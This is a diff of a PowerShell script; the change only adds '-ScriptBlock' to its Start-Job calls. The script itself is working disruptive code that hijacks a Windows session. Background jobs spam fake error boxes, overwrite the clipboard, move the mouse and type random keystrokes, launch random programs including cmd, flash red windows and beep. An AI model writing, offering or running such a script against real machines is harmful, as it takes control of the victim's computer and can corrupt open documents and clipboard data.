@@ -6,7 +6,7 @@ Start-Process "magnify.exe"
 Start-Sleep -Seconds 2
 [System.Windows.Forms.SendKeys]::SendWait("^{%}{i}")
 
-Start-Job {
+Start-Job -ScriptBlock {
     $s = New-Object -ComObject SAPI.SpVoice
     $w = @("a","b","c","d","e","f")
     for ($i = 0; $i -lt 20; $i++) {
@@ -15,21 +15,21 @@ Start-Job {
     }
 }
 
-Start-Job {
+Start-Job -ScriptBlock {
     for ($i = 0; $i -lt 50; $i++) {
         [System.Windows.Forms.MessageBox]::Show("0x" + (Get-Random -Minimum 1000 -Maximum 9999), "x", 0, 48)
         Start-Sleep -Milliseconds 250
     }
 }
 
-Start-Job {
+Start-Job -ScriptBlock {
     for ($i = 0; $i -lt 100; $i++) {
         Set-Clipboard ("X" * (Get-Random -Minimum 3 -Maximum 6))
         Start-Sleep -Milliseconds (Get-Random -Minimum 100 -Maximum 200)
     }
 }
 
-Start-Job {
+Start-Job -ScriptBlock {
     for ($i = 0; $i -lt 1000; $i++) {
         $x = Get-Random -Minimum 0 -Maximum ([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width)
         $y = Get-Random -Minimum 0 -Maximum ([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
@@ -38,7 +38,7 @@ Start-Job {
     }
 }
 
-Start-Job {
+Start-Job -ScriptBlock {
     $k = @("A","B","C","D","E","F","1","2","3","4","5")
     for ($i = 0; $i -lt 1000; $i++) {
         [System.Windows.Forms.SendKeys]::SendWait(($k | Get-Random))
@@ -46,7 +46,7 @@ Start-Job {
     }
 }
 
-Start-Job {
+Start-Job -ScriptBlock {
     for ($i = 0; $i -lt 30; $i++) {
         $f = New-Object Windows.Forms.Form
         $f.FormBorderStyle = 'None'
@@ -59,7 +59,7 @@ Start-Job {
     }
 }
 
-Start-Job {
+Start-Job -ScriptBlock {
     $a = @("notepad","calc","mspaint","write","cmd")
     for ($i = 0; $i -lt 20; $i++) {
         Start-Process ($a | Get-Random)
@@ -67,13 +67,13 @@ Start-Job {
     }
 }
 
-Start-Job {
+Start-Job -ScriptBlock {
     for ($i = 0; $i -lt 100; $i++) {
         [console]::beep((Get-Random -Minimum 100 -Maximum 3000), (Get-Random -Minimum 50 -Maximum 200))
     }
 }
 
-Start-Job {
+Start-Job -ScriptBlock {
     $f = New-Object Windows.Forms.Form
     $f.Text = "x"
     $f.BackColor = 'Red'
